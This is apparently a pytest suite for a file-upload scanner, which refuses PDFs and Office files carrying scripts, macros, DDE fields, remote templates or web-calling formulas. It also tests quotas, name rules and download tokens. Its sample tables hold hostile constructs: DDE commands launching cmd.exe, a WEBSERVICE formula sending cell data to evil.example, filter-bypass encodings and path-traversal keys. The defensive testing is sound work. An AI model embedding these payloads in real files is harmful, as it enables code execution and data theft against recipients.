"""File uploads (PLAN.md 6.1).

The task's "done when" lines, each through the real endpoints, a real
database and a real (local directory) file store:

- upload and download work: the bytes that come back are the bytes sent;
- others can't access: another account gets 404 for everything;
- bad or oversized files are refused, and their bytes deleted;
- the quota says "near the limit" before it says no.

The scanner is tested on files built in memory (``tests/upload_samples.py``)
and on the real workbooks already in the repository.
"""
import base64
import binascii
import glob
import io
import json
import logging
import os
import random
import subprocess
import sys
import time
import tracemalloc
import urllib.error
import uuid
import zlib
from datetime import timedelta

import pytest
from fastapi.testclient import TestClient
from sqlalchemy import select

from api import limits
from api.auth import AuthUser, require_user
from api.main import app
from db import engine as db_engine
from db import files as rows
from db.models import AuditEvent, StoredFile, utc_now
from jobs.runner import Runner
from jobs.scheduled import job_maintenance
from tests import upload_samples as s
from tests.test_deals import PROFILE
from uploads import rules, scan as scanner, service, store as stores
from uploads.scan import scan

client = TestClient(app)
MB = rules.MB


# ---------------------------------------------------------------------------
# The scanner
# ---------------------------------------------------------------------------
def template(target: str) -> str:
    return s.RELS.format(s.relationship("attachedTemplate", target, external=True))


def rels(*relationships: str) -> str:
    return s.RELS.format("".join(relationships))


def raw_relationship(attributes: str) -> str:
    return (f'<Relationship {attributes} Type="http://schemas.openxmlformats.org/officeDocument/2006/'
            f'relationships/attachedTemplate" Target="http://evil.example/t.dotm"/>')


R = "http://schemas.openxmlformats.org/officeDocument/2006/relationships/"


def sheet(formula: str) -> bytes:
    return s.open_xml("xlsx", {"xl/worksheets/sheet1.xml": (
        f"<worksheet><sheetData><row><c><f>{formula}</f></c></row></sheetData></worksheet>")})


def field(*instructions: str) -> bytes:
    return s.open_xml("docx", main=s.word_document(*[(i,) for i in instructions]))


VML = (b'<w:document xmlns:w="w" xmlns:v="urn:schemas-microsoft-com:vml" xmlns:r="r" '
       b'xmlns:o="urn:schemas-microsoft-com:office:office"><v:imagedata %s/></w:document>')
FONT = b"<< /Type /Font /Subtype /Type1 /BaseFont /Helvetica >>"
SCRIPT_KEY = b"<< /JS (x) >>"

CLEAN = {
    "a plain PDF": (lambda: s.pdf(), "pdf"),
    "a PDF with an object stream": (lambda: s.pdf(compressed=(FONT,)), "pdf"),
    "a PDF whose image data happens to spell a script key": (lambda: s.pdf(
        (b"/Subtype /Image /Filter /DCTDecode", b"\xff\xd8" + b"\x00/JS (\x00/XFA [" * 4)), "pdf"),
    "a workbook": (lambda: s.open_xml("xlsx"), "xlsx"),
    "a document": (lambda: s.open_xml("docx"), "docx"),
    "a document with a link to click": (lambda: s.open_xml("docx", {
        "word/_rels/document.xml.rels": rels(s.relationship("hyperlink", "https://example.com", external=True))}),
        "docx"),
    "a document whose fields only mention DDE in passing": (lambda: s.open_xml("docx", main=s.word_document(
        ("HYPERLINK ", '"https://example.com/DDE"'), ("REF DDEAUTOMATION",))), "docx"),
    "a document with a table of contents field": (
        lambda: s.open_xml("docx", main=s.word_fields("TOC \\o ", '"1-3"')), "docx"),
    "a document with a chart's workbook inside": (lambda: s.open_xml("docx", {
        "word/_rels/document.xml.rels": rels(s.relationship("package", "embeddings/Sheet1.xlsx")),
        "word/embeddings/Sheet1.xlsx": s.open_xml("xlsx")}), "docx"),
    "a workbook that refers to another workbook": (lambda: s.open_xml("xlsx", {
        "xl/externalLinks/externalLink1.xml": "<externalLink><externalBook/></externalLink>",
        "xl/externalLinks/_rels/externalLink1.xml.rels": rels(
            s.relationship("externalLinkPath", "other.xlsx", external=True))}), "xlsx"),
    "an old Word document": (lambda: s.word_binary(), "doc"),
    "an old Word document that only mentions the words": (lambda: s.word_binary(
        {"Data": b"\x13 PAGE \x14 1\x15 LINKS and DDE in prose, INCLUDE too"}), "doc"),
    "a PDF with a link to a web page": (lambda: s.pdf(b"<< /S /URI /URI (https://example.com) >>"), "pdf"),
    "a workbook of ordinary formulas": (lambda: sheet(
        "SUM(A1:A9)*IF(B1=\"a|b\",1,2)+'[1]Sheet 1'!A1+VLOOKUP(A1,B:C,2,0)"), "xlsx"),
    "a workbook with document properties in custom XML": (
        lambda: s.open_xml("xlsx", {"customXml/item1.xml": "<properties><owner/></properties>"}), "xlsx"),
    "a document with page numbers and a link whose address says LINK": (
        lambda: field("PAGE", 'HYPERLINK "https://example.com/LINK"'), "docx"),
    "a document with a drawing that names its picture by relationship": (
        lambda: s.open_xml("docx", main=VML % b'r:id="rId5"'), "docx"),
}

REFUSED = {
    # PDF: what the parser finds, however it is written
    "JavaScript": (lambda: s.pdf(s.JAVASCRIPT), "pdf", "active_content"),
    "JavaScript spelt with hex escapes": (
        lambda: s.pdf(b"<< /S /J#61vaScript /J#53 (x) >>"), "pdf", "active_content"),
    "a script key with no action name beside it": (lambda: s.pdf(b"<< /S /Foo /J#53 (x) >>"), "pdf", "active_content"),
    "a launch action": (lambda: s.pdf(b"<< /S /Launch /F (cmd.exe) >>"), "pdf", "active_content"),
    "an XFA form": (lambda: s.pdf(b"<< /Fields [] /XFA [(template) 4 0 R] >>"), "pdf", "active_content"),
    "a file attached inside": (
        lambda: s.pdf(b"<< /Type /Filespec /EF << /F 4 0 R >> >>", b"<< /EmbeddedFiles << /Names [] >> >>"),
        "pdf", "active_content"),
    # (the second review) attachments and actions with ordinary names
    "a file attachment with no embedded-file type": (lambda: s.pdf(
        (b"/Subtype /Foo", b"payload"), b"<< /Type /Filespec /F (a.vbs) /EF << /F 5 0 R >> >>",
        b"<< /Type /Annot /Subtype /FileAttachment /Rect [0 0 20 20] /FS 6 0 R >>"), "pdf", "active_content"),
    "an action that opens another file": (
        lambda: s.pdf(b"<< /S /GoToR /F (//evil/share/x.pdf) /D [0 /Fit] >>"), "pdf", "active_content"),
    "a 3D annotation": (lambda: s.pdf(b"<< /Type /Annot /Subtype /3D /3DD 4 0 R >>"), "pdf", "active_content"),
    "a script in an object the parser could not finish reading": (lambda: s.pdf(
        compressed=(b"<< /S /JavaScript /JS (x) ", b"<< /Z 1 >>"),
        object_stream=b"/Type /ObjStm /Filter [/ASCIIHexDecode /FlateDecode]",
        encode=lambda b: binascii.hexlify(zlib.compress(b)) + b">"), "pdf", "active_content"),
    "a packed object the parser could not read, whatever it holds": (lambda: s.pdf(
        compressed=(b"<< /Foo (x) ", b"<< /Z 1 >>")), "pdf", "unreadable"),
    "JavaScript inside an object stream": (lambda: s.pdf(compressed=(s.JAVASCRIPT,)), "pdf", "active_content"),
    "a script key alone inside an object stream": (lambda: s.pdf(compressed=(SCRIPT_KEY,)), "pdf", "active_content"),
    "an object stream behind a second encoding": (lambda: s.pdf(
        compressed=(SCRIPT_KEY,), object_stream=b"/Type /ObjStm /Filter [/ASCII85Decode /FlateDecode]",
        encode=lambda b: base64.a85encode(zlib.compress(b)) + b"~>"), "pdf", "active_content"),
    "an object stream compressed twice": (lambda: s.pdf(
        compressed=(SCRIPT_KEY,), object_stream=b"/Type /ObjStm /Filter [/FlateDecode /FlateDecode]",
        encode=lambda b: zlib.compress(zlib.compress(b))), "pdf", "active_content"),
    "an object stream that does not say it is one": (lambda: s.pdf(
        compressed=(SCRIPT_KEY,), object_stream=b"/Filter /FlateDecode"), "pdf", "active_content"),
    "an object stream that is not compressed": (lambda: s.pdf(
        compressed=(SCRIPT_KEY,), object_stream=b"/Type /ObjStm", encode=lambda b: b), "pdf", "active_content"),
    # (the security review's bypass) a comment made to look like the start of a stream
    "an object stream after a decoy stream keyword": (
        lambda: s.pdf(compressed=(SCRIPT_KEY,), before=b"%stream\n"), "pdf", "active_content"),
    "an encrypted PDF": (
        lambda: s.pdf(b"<< /Filter /Standard /V 4 >>", trailer=b"/Encrypt 5 0 R"), "pdf", "encrypted"),
    "a PDF with no cross-reference table to follow": (lambda: s.pdf()[:300], "pdf", "unreadable"),
    "a program named .pdf": (lambda: b"MZ\x90\x00" + b"\0" * 200, "pdf", "wrong_type"),
    "a PDF hidden behind other bytes": (lambda: b"GIF89a" + s.pdf(), "pdf", "wrong_type"),
    # Office Open XML
    "a workbook named .docx": (lambda: s.open_xml("xlsx"), "docx", "wrong_type"),
    "a macro project": (
        lambda: s.open_xml("xlsx", {"xl/vbaProject.bin": s.OLE_MAGIC + b"\0" * 600}), "xlsx", "macros"),
    "a macro-enabled content type": (lambda: s.open_xml("xlsx", content_types=(
        '<Types><Override PartName="/xl/workbook.xml" '
        'ContentType="application/vnd.ms-excel.sheet.macroEnabled.main+xml"/></Types>')), "xlsx", "macros"),
    "a macro relationship under an innocent name": (lambda: s.open_xml("xlsx", {
        "xl/_rels/workbook.xml.rels": rels(s.relationship("vbaProject", "styles2.xml"))}), "xlsx", "macros"),
    "an OLE object under an innocent name": (
        lambda: s.open_xml("xlsx", {"xl/media/image1.png": s.OLE_MAGIC + b"\0" * 600}),
        "xlsx", "active_content"),
    "a remote template": (lambda: s.open_xml("docx", {"word/_rels/settings.xml.rels": rels(
        s.relationship("attachedTemplate", "https://example.com/t.dotm", external=True))}), "docx", "active_content"),
    "a remote template in UTF-16": (lambda: s.open_xml("docx", {"word/_rels/settings.xml.rels": rels(
        s.relationship("attachedTemplate", "https://example.com/t.dotm", external=True)).encode("utf-16")}),
        "docx", "active_content"),
    "a remote template in UTF-16 with no byte-order mark": (lambda: s.open_xml("docx", {
        "word/_rels/settings.xml.rels": ('<?xml version="1.0" encoding="UTF-16"?>' + rels(s.relationship(
            "attachedTemplate", "http://e/t.dotm", external=True))).encode("utf-16-le")}), "docx", "active_content"),
    # (the security review's bypasses) the same thing written so a pattern match misses it
    "a remote template with External written as character references": (lambda: s.open_xml("docx", {
        "word/_rels/settings.xml.rels": rels(raw_relationship('Id="r1" TargetMode="Ext&#101;rnal"'))}),
        "docx", "active_content"),
    "a remote template after an attribute holding a closing bracket": (lambda: s.open_xml("docx", {
        "word/_rels/settings.xml.rels": rels(raw_relationship('Id="a>b" TargetMode="External"'))}),
        "docx", "active_content"),
    "a picture fetched from elsewhere": (lambda: s.open_xml("docx", {"word/_rels/document.xml.rels": rels(
        s.relationship("image", "http://tracker.example/x.png", external=True))}), "docx", "active_content"),
    "an entity defined to spell External": (lambda: s.open_xml("docx", {
        "word/_rels/settings.xml.rels": '<!DOCTYPE r [<!ENTITY x "External">]>' + rels(
            raw_relationship('Id="r" TargetMode="&x;"'))}), "docx", "unreadable"),
    "a part that is not well-formed XML": (lambda: s.open_xml("docx", main=b"<w:document"), "docx", "unreadable"),
    "a DDE field split over two runs": (
        lambda: s.open_xml("docx", main=s.word_fields("DD", "EAUTO c:\\\\x.exe")), "docx", "active_content"),
    "a DDE field after a harmless one": (lambda: s.open_xml("docx", main=s.word_document(
        ("TOC \\o ", '"1-3"'), ("DDEAUTO c:\\\\x.exe",))), "docx", "active_content"),
    "a DDE field written with character references": (
        lambda: s.open_xml("docx", main=s.word_fields("&#68;DEAUTO c:\\\\x.exe")), "docx", "active_content"),
    "a DDE field inside CDATA": (
        lambda: s.open_xml("docx", main=s.word_fields("<![CDATA[DDEAUTO x]]>")), "docx", "active_content"),
    "a DDE field in the glossary document": (lambda: s.open_xml("docx", {
        "word/glossary/document.xml": s.word_fields("DDEAUTO x")}), "docx", "active_content"),
    "an imported chunk in another format": (lambda: s.open_xml("docx", {
        "word/_rels/document.xml.rels": rels(s.relationship("aFChunk", "chunk.rtf")),
        "word/chunk.rtf": "{\\rtf1}"}), "docx", "active_content"),
    "an embedded object": (
        lambda: s.open_xml("docx", {"word/embeddings/oleObject1.bin": b"hello"}), "docx", "active_content"),
    "an embedded object by its relationship alone": (lambda: s.open_xml("xlsx", {
        "xl/worksheets/_rels/sheet1.xml.rels": rels(s.relationship("oleObject", "../data.dat"))}),
        "xlsx", "active_content"),
    "a package inside the package, outside embeddings": (
        lambda: s.open_xml("docx", {"word/media/chart.bin": s.open_xml("xlsx")}), "docx", "active_content"),
    "an ActiveX control": (
        lambda: s.open_xml("docx", {"word/activeX/activeX1.xml": "<ocx/>"}), "docx", "active_content"),
    "macros in an embedded workbook": (lambda: s.open_xml("docx", {
        "word/embeddings/Sheet1.xlsx": s.open_xml("xlsx", {"xl/vbaProject.bin": b"x"})}), "docx", "macros"),
    "a workbook with a DDE link": (lambda: s.open_xml("xlsx", {
        "xl/externalLinks/externalLink1.xml":
            '<externalLink><ddeLink ddeService="cmd" ddeTopic="/c calc"/></externalLink>'}),
        "xlsx", "active_content"),
    "a password-protected workbook": (
        lambda: s.compound_file({"EncryptedPackage": b"x", "EncryptionInfo": b"x"}), "xlsx", "encrypted"),
    "not a zip at all": (lambda: b"PK\x03\x04" + b"junk" * 50, "xlsx", "wrong_type"),
    # (the second review) attributes written twice, in another letter case or namespace
    "a relationship type written twice, the harmless one last": (lambda: s.open_xml("docx", {
        "word/_rels/document.xml.rels": rels(
            f'<Relationship Id="r" Type="{R}oleObject" type="{R}hyperlink" Target="http://e/x" '
            'TargetMode="External"/>')}), "docx", "active_content"),
    "a relationship type repeated in another namespace": (lambda: s.open_xml("docx", {
        "word/_rels/document.xml.rels": rels(
            f'<Relationship xmlns:x="urn:u" Id="r" Type="{R}oleObject" x:Type="{R}hyperlink" '
            'Target="http://e" TargetMode="External"/>')}), "docx", "active_content"),
    "an outside target relabelled Internal in another namespace": (lambda: s.open_xml("docx", {
        "word/_rels/document.xml.rels": rels(
            f'<Relationship xmlns:x="urn:u" Id="r" Type="{R}image" Target="//evil/x.png" '
            'TargetMode="External" x:TargetMode="Internal"/>')}), "docx", "active_content"),
    "two parts under one name": (lambda: s.open_xml("docx", {"WORD/DOCUMENT.XML": "<d/>"}),
                                 "docx", "unreadable"),
    # (the second review) what a workbook can fetch or run without a macro
    "a DDE formula in a cell": (lambda: sheet("cmd|' /c calc'!A1"), "xlsx", "active_content"),
    "a formula that calls a web address": (
        lambda: sheet('_xlfn.WEBSERVICE("http://evil.example/?"&amp;B1)'), "xlsx", "active_content"),
    "a web formula split by a comment": (lambda: sheet("WEB<!-- -->SERVICE(A1)"), "xlsx", "active_content"),
    "a web formula written with CDATA and character references": (
        lambda: sheet("<![CDATA[FILTER]]>&#88;ML(A1,B1)"), "xlsx", "active_content"),
    "a data connection": (lambda: s.open_xml("xlsx", {"xl/connections.xml": "<connections/>"}),
                          "xlsx", "active_content"),
    "a data connection by its relationship alone": (lambda: s.open_xml("xlsx", {
        "xl/_rels/workbook.xml.rels": rels(s.relationship("connections", "data.xml"))}), "xlsx", "active_content"),
    "a Power Query": (lambda: s.open_xml("xlsx", {"customXml/item1.xml": (
        '<DataMashup xmlns="http://schemas.microsoft.com/DataMashup">x</DataMashup>')}), "xlsx", "active_content"),
    "a custom ribbon": (lambda: s.open_xml("xlsx", {"customUI/customUI14.xml": "<customUI/>"}),
                        "xlsx", "active_content"),
    # (the second review) Word fields and drawings that fetch
    "a field that includes a picture from elsewhere": (
        lambda: field('INCLUDEPICTURE "//evil/x.png"'), "docx", "active_content"),
    "a field that includes another document": (
        lambda: field("PAGE", 'INCLUDETEXT "http://evil.example/x.docx"'), "docx", "active_content"),
    "a field linked to another program's file": (
        lambda: field('LINK Excel.Sheet.8 "x.xls"'), "docx", "active_content"),
    "a drawing that fetches its picture": (
        lambda: s.open_xml("docx", main=VML % b'o:href="http://evil.example/p.png"'), "docx", "active_content"),
    # The older binary formats
    "an old document with a DDE field in two-byte text": (lambda: s.word_binary({"Data": (
        '\x13 DDEAUTO c:\\\\cmd.exe "/k calc"\x14r\x15').encode("utf-16-le")}), "doc", "active_content"),
    "an old document with a field that includes a file": (lambda: s.word_binary({"Data": (
        b'\x13 INCLUDETEXT "//evil/x.doc" \x14r\x15')}), "doc", "active_content"),
    "an old document with macros": (lambda: s.word_binary(s.MACRO_PROJECT), "doc", "macros"),
    "an old document with an embedded object": (
        lambda: s.word_binary({"ObjectPool/_123/\x01Ole10Native": b"x"}), "doc", "active_content"),
    "an old document named .xls": (lambda: s.word_binary(), "xls", "wrong_type"),
    # Any kind
    "an empty file": (lambda: b"", "pdf", "empty"),
    "a kind nobody accepts": (lambda: s.pdf(), "exe", "wrong_type"),
}


@pytest.mark.parametrize("case", CLEAN)
def test_an_ordinary_file_passes(case):
    build, kind = CLEAN[case]
    assert scan(build(), kind) == scanner.CLEAN


@pytest.mark.parametrize("case", REFUSED)
def test_a_file_that_can_act_or_cannot_be_read_is_refused(case):
    build, kind, reason = REFUSED[case]
    verdict = scan(build(), kind)
    assert (verdict.clean, verdict.reason) == (False, reason)
    assert reason in rules.REASONS


def test_each_reader_of_a_pdf_refuses_on_its_own():
    """Two readers, and either one's finding is enough: the parser walking
    the objects, and the search of the raw bytes and of object streams."""
    for sample in (s.pdf(s.JAVASCRIPT), s.pdf(compressed=(s.JAVASCRIPT,)), s.pdf(compressed=(SCRIPT_KEY,))):
        with pytest.raises(scanner.Refused):
            scanner._check_pdf_objects(sample)
        with pytest.raises(scanner.Refused):
            scanner._check_pdf_bytes(sample)
    scanner._check_pdf_objects(s.pdf(compressed=(FONT,)))
    scanner._check_pdf_bytes(s.pdf(compressed=(FONT,)))


@pytest.mark.parametrize("repeated", [b"<w:fldSimple ", b"<w:fldChar ", b"<w:instrText>", b"<Relationship "])
def test_a_part_built_to_make_a_pattern_match_crawl_is_answered_at_once(repeated):
    """(The security review's denial of service.) 100 KB of an opening tag
    repeated took a pattern match seconds, and a megabyte minutes; a parser
    reads it once."""
    bomb = b"<w:document xmlns:w='x'>" + repeated * 2_000_000
    for sample in (s.open_xml("docx", main=bomb), s.open_xml("docx", {"word/_rels/x.rels": bomb})):
        assert len(sample) < 100_000
        started = time.perf_counter()
        assert scan(sample, "docx").reason == "unreadable"
        assert time.perf_counter() - started < 5
    # ... and a well-formed part with a million fields is simply read
    many = b"<w:document xmlns:w='x'>" + b"<w:fldSimple w:instr='PAGE'/>" * 1_000_000 + b"</w:document>"
    started = time.perf_counter()
    assert scan(s.open_xml("docx", main=many), "docx") == scanner.CLEAN
    assert time.perf_counter() - started < 20


def test_a_pdf_built_to_keep_the_scanner_busy_is_answered_in_seconds():
    """(The second review.) Handing zlib the rest of the file at every place
    a stream may begin copied the rest of the file each time: 18 seconds for
    4 MB, minutes for 20. Now each place costs what stands there."""
    size = 20 * MB
    shapes = [(b"%PDF-1.7\n" + b"stream\n\x78\x9c" * (size // 9))[:size],
              b"%PDF-1.7\n" + (b"stream\n" + zlib.compress(b"x" * 300)) * 300_000,
              b"%PDF-1.7\n" + (b"stream\n" + zlib.compress(b"1 0 << /A 1 >>")) * 300_000]
    for sample in shapes:
        started = time.perf_counter()
        assert scan(sample, "pdf").reason == "unreadable"
        assert time.perf_counter() - started < 15


def test_a_file_may_have_only_so_much_xml_parsed(monkeypatch):
    part = b"<d>" + b"<a/>" * 100_000 + b"</d>"
    sample = s.open_xml("docx", {f"word/extra{n}.xml": part for n in range(4)})
    assert scan(sample, "docx") == scanner.CLEAN
    monkeypatch.setattr(scanner, "XML_BUDGET_BYTES", 3 * len(part))
    assert scan(sample, "docx").reason == "unreadable"
    # The text of a part is only handed over inside the elements that are read
    story = (b"<w:document xmlns:w='x'><w:t>" + b"DDEAUTO " * 1000 + b"</w:t></w:document>")
    assert scan(s.open_xml("docx", main=story), "docx") == scanner.CLEAN


def test_an_object_stream_the_table_does_not_lead_to_is_not_vouched_for():
    """A reader in repair mode opens object streams it finds by looking; one
    the cross-reference table never mentions was read by nobody here."""
    hidden = s._stream(b"/Type /ObjStm /N 1 /First 4 /Filter /ASCIIHexDecode", b"3920302030203c3c2f4a53202878293e3e>")
    stray = b"9 0 obj\n" + hidden + b"\nendobj\n"
    assert scan(s.pdf(before=stray), "pdf").reason == "unreadable"
    assert scan(s.pdf(compressed=(FONT,)), "pdf") == scanner.CLEAN


def test_real_workbooks_in_the_repository_pass():
    real = sorted(glob.glob("tests/fixtures/benchmarks/damodaran/*.xls"))
    assert len(real) > 30
    for path in real + ["tests/reference/reference_cases.xlsx", "Simulation_Model_Template.xlsx"]:
        with open(path, "rb") as source:
            assert scan(source.read(), path.rsplit(".", 1)[1]) == scanner.CLEAN, path


def test_an_old_workbook_with_a_dde_link_or_a_password_is_refused():
    with open(sorted(glob.glob("tests/fixtures/benchmarks/damodaran/*.xls"))[0], "rb") as source:
        workbook = source.read()
    marker = b"\x09\x08"                       # the workbook stream's first record (BOF)
    at = workbook.index(marker)
    # A SupBook record with no sheets and a path: a DDE or OLE data source
    link = b"\xae\x01\x08\x00" + b"\x00\x00\x03\x00\x00cmd"
    assert scan(workbook[:at] + link + workbook[at + len(link):], "xls").reason == "active_content"
    password = b"\x2f\x00\x02\x00\x00\x00"       # FilePass
    assert scan(workbook[:at] + password + workbook[at + len(password):], "xls").reason == "encrypted"


def test_a_long_name_is_refused_even_inside_image_data():
    """A name too long to be chance is refused wherever it stands; the short
    ones are left to the parser (see the clean case above)."""
    hidden = (b"/Subtype /Image", b"\xff\xd8 /JavaScript ")
    assert scan(s.pdf(hidden), "pdf").reason == "active_content"


def test_an_archive_that_expands_out_of_proportion_is_refused(monkeypatch):
    monkeypatch.setattr(scanner, "ARCHIVE_MAX_BYTES", MB)
    bomb = s.open_xml("xlsx", {"xl/worksheets/sheet1.xml": b"0" * (2 * MB)})
    assert len(bomb) < 10_000
    assert scan(bomb, "xlsx").reason == "archive_bomb"
    monkeypatch.setattr(scanner, "ARCHIVE_MAX_BYTES", 512 * MB)
    monkeypatch.setattr(scanner, "PART_MAX_BYTES", 1000)
    story = s.open_xml("docx", main=b"<w:document>" + b"<w:p/>" * 1000 + b"</w:document>")
    assert scan(story, "docx").reason == "unreadable"


def test_an_object_stream_that_inflates_past_the_cap_is_refused(monkeypatch):
    monkeypatch.setattr(scanner, "OBJECT_STREAM_MAX", 10_000)
    assert scan(s.pdf(compressed=(FONT,) * 500), "pdf").reason == "unreadable"


def test_the_scanner_never_raises_whatever_it_is_given():
    """Truncated and corrupted files end in a verdict, never an exception."""
    rnd = random.Random(11)
    samples = [(build(), kind) for build, kind in CLEAN.values()]
    for data, kind in samples:
        for _ in range(25):
            mangled = bytearray(data[:rnd.randrange(1, len(data) + 1)])
            for _ in range(rnd.randrange(0, 8)):
                mangled[rnd.randrange(len(mangled))] = rnd.randrange(256)
            verdict = scan(bytes(mangled), kind)
            assert verdict.clean or verdict.reason in rules.REASONS


def test_a_scanner_that_fails_refuses_the_file(monkeypatch):
    def broken(data):
        raise RuntimeError("the file said: secret figures")
    monkeypatch.setitem(scanner._CHECKS, "pdf", broken)
    assert scan(s.pdf(), "pdf") == scanner.Verdict(False, "scan_failed")


@pytest.mark.parametrize("kind", ["pdf", "docx"])
def test_scanning_a_file_at_the_size_limit_stays_small(kind):
    """Measured for the free server's 512 MB: the scanner adds under 100 MB to
    the file it is handed (ClamAV needed 1,687 MB for a 60-byte PDF)."""
    rnd = random.Random(3)
    if kind == "pdf":
        data = s.pdf(compressed=(FONT,) * 20_000, padding=19 * MB)
    else:
        story = (b'<w:document xmlns:w="x"><w:body>'
                 + b"<w:p><w:r><w:t>Annual report text here</w:t></w:r></w:p>" * 500_000
                 + b"</w:body></w:document>")
        data = s.open_xml("docx", {"word/media/image1.jpg": rnd.randbytes(19 * MB)}, main=story)
    assert 19 * MB < len(data) <= rules.MAX_FILE_BYTES
    tracemalloc.start()
    try:
        verdict = scan(data, kind)
        _, peak = tracemalloc.get_traced_memory()
    finally:
        tracemalloc.stop()
    assert verdict == scanner.CLEAN
    assert peak < 100 * MB, f"{peak / MB:.0f} MB"


# ---------------------------------------------------------------------------
# The rules
# ---------------------------------------------------------------------------
def test_a_name_is_its_last_component_without_hidden_characters():
    assert rules.clean_name("C:\\Users\\me\\Annual  report.PDF") == "Annual report.PDF"
    assert rules.clean_name("../../etc/report.pdf") == "report.pdf"
    assert rules.clean_name("report\u202efdp.exe") == "reportfdp.exe"
    for bad in ("", "   ", ".pdf", "a" * 121 + ".pdf", "folder/"):
        with pytest.raises(rules.InvalidUpload) as refused:
            rules.clean_name(bad)
        assert refused.value.code == "bad_name"


def test_only_the_listed_kinds_are_accepted_whatever_the_case():
    assert [rules.kind_of(n).id for n in ("a.pdf", "a.XLSX", "a.b.docx", "a.xls", "a.Doc")] == [
        "pdf", "xlsx", "docx", "xls", "doc"]
    for name in ("a.xlsm", "a.docm", "a.exe", "a.pdf.exe", "pdf", "a.zip", "a.rtf"):
        with pytest.raises(rules.InvalidUpload) as refused:
            rules.kind_of(name)
        assert refused.value.code == "bad_type"


def test_room_is_refused_exactly_past_each_limit():
    room = dict(user_bytes=0, user_files=0, total_bytes=0, budget=800 * MB)
    rules.check_room(rules.USER_QUOTA_BYTES, **room)
    for change, code in (({"user_bytes": 1}, "quota_bytes"), ({"user_files": rules.USER_MAX_FILES}, "quota_files"),
                         ({"total_bytes": 800 * MB - rules.USER_QUOTA_BYTES + 1}, "storage_full")):
        with pytest.raises(rules.InvalidUpload) as refused:
            rules.check_room(rules.USER_QUOTA_BYTES, **{**room, **change})
        assert refused.value.code == code


def test_usage_warns_from_eighty_per_cent_of_either_limit():
    assert rules.usage(int(0.79 * rules.USER_QUOTA_BYTES), 1)["near_limit"] is False
    assert rules.usage(int(0.8 * rules.USER_QUOTA_BYTES), 1)["near_limit"] is True
    assert rules.usage(0, int(0.8 * rules.USER_MAX_FILES))["near_limit"] is True
    full = rules.usage(rules.USER_QUOTA_BYTES, 1)
    assert (full["near_limit"], full["full"]) == (True, True)


def test_the_budget_can_be_lowered_but_not_past_the_free_gigabyte():
    assert rules.total_budget_bytes({}) == 800 * MB
    assert rules.total_budget_bytes({"FSE_UPLOADS_BUDGET_MB": "250"}) == 250 * MB
    assert rules.total_budget_bytes({"FSE_UPLOADS_BUDGET_MB": "5000"}) == 900 * MB
    assert rules.total_budget_bytes({"FSE_UPLOADS_BUDGET_MB": "nonsense"}) == 800 * MB


# ---------------------------------------------------------------------------
# The scan in a process of its own
# ---------------------------------------------------------------------------
def test_the_child_process_gives_the_same_verdicts(tmp_path):
    for name, (data, kind, expected) in {
            "clean.pdf": (s.pdf(), "pdf", scanner.CLEAN),
            "scripted.pdf": (s.pdf(s.JAVASCRIPT), "pdf", scanner.Verdict(False, "active_content")),
            "macros.xlsx": (s.open_xml("xlsx", {"xl/vbaProject.bin": b"x"}), "xlsx", scanner.Verdict(False, "macros")),
            "old.doc": (s.word_binary(), "doc", scanner.CLEAN)}.items():
        path = tmp_path / name
        path.write_bytes(data)
        assert scanner.scan_path(path, kind) == expected, name


def test_a_scan_that_overruns_dies_or_answers_nonsense_refuses_the_file(tmp_path, monkeypatch):
    path = tmp_path / "report.pdf"
    path.write_bytes(s.pdf())
    assert scanner.scan_path(path, "pdf", timeout=0.001) == scanner.FAILED          # killed at its deadline
    assert scanner.scan_path(tmp_path / "missing.pdf", "pdf") == scanner.FAILED
    for answer in (subprocess.CompletedProcess([], 0, b"refused"), subprocess.CompletedProcess([], 3, b"clean"),
                   subprocess.CompletedProcess([], -9, b""), subprocess.CompletedProcess([], 3, b"anything"),
                   subprocess.CompletedProcess([], 1, b"clean")):
        monkeypatch.setattr(subprocess, "run", lambda *a, answer=answer, **k: answer)
        assert scanner.scan_path(path, "pdf") == scanner.FAILED


def test_the_child_process_is_given_none_of_the_servers_secrets(tmp_path, monkeypatch):
    monkeypatch.setenv("DATABASE_URL", "postgresql://secret")
    monkeypatch.setenv("SUPABASE_UPLOADS_KEY", "sb_secret_x")
    seen = {}

    def run(command, **kwargs):
        seen.update(kwargs, command=command)
        return subprocess.CompletedProcess(command, 0, b"clean")
    monkeypatch.setattr(subprocess, "run", run)
    assert scanner.scan_path(tmp_path / "a.pdf", "pdf") == scanner.CLEAN
    assert set(seen["env"]) == {"PATH", "PYTHONPATH", "PYTHONDONTWRITEBYTECODE", "PYTHONIOENCODING"}
    assert seen["command"][:3] == [sys.executable, "-m", "uploads.scan"] and seen["timeout"] == scanner.SCAN_TIMEOUT_S


def test_the_child_limits_its_own_processor_time():
    code = ("import resource, uploads.scan as s; s._limit_this_process(); "
            "print(resource.getrlimit(resource.RLIMIT_CPU)[0], resource.getrlimit(resource.RLIMIT_CORE)[0])")
    out = subprocess.run([sys.executable, "-c", code], capture_output=True, check=True, env={
        "PATH": os.environ.get("PATH", ""), "PYTHONPATH": os.getcwd()}).stdout.split()
    assert [int(v) for v in out] == [scanner.SCAN_CPU_S, 0]


# ---------------------------------------------------------------------------
# The stores
# ---------------------------------------------------------------------------
KEY = "u7/00000000-0000-4000-8000-000000000001"


def test_a_local_download_link_is_for_one_object_until_it_expires(tmp_path):
    local = stores.LocalFiles(tmp_path / "store")
    source = tmp_path / "source"
    source.write_bytes(b"abc")
    local.put(KEY, source)
    with pytest.raises(stores.StorageError):
        local.put(KEY, source)                                     # a name is stored once
    get = local.download_url(KEY, "report.pdf", 60).removeprefix(stores.LOCAL_PATH)
    assert local.open_token(get, "get") == {**local.open_token(get, "get"), "key": KEY, "name": "report.pdf"}
    body, mark = get.split(".")
    forged = base64.urlsafe_b64encode(json.dumps(
        {"op": "get", "key": "u8/00000000-0000-4000-8000-000000000001", "exp": 9e12}).encode()).decode()
    for bad, operation in ((get, "put"), (f"{forged}.{mark}", "get"), (f"{body}.{'0' * 64}", "get"),
                           ("nonsense", "get"), (f"{body}.café", "get"), ("", "get")):
        with pytest.raises(stores.BadToken):
            local.open_token(bad, operation)
    with pytest.raises(stores.BadToken):
        local.open_token(get, "get", now=9e12)
    with pytest.raises(stores.BadToken):
        stores.LocalFiles(tmp_path / "store").open_token(get, "get")      # another process's key
    target = tmp_path / "back"
    assert local.fetch(KEY, target, 10) == 3 and target.read_bytes() == b"abc"
    with pytest.raises(stores.TooLarge):
        local.fetch(KEY, target, 2)
    assert local.size(KEY) == 3 and [o.key for o in local.objects()] == [KEY]


@pytest.mark.parametrize("key", ["../etc/passwd", "u7/../../x", "u7/abc", "backups/production/x.dump.enc",
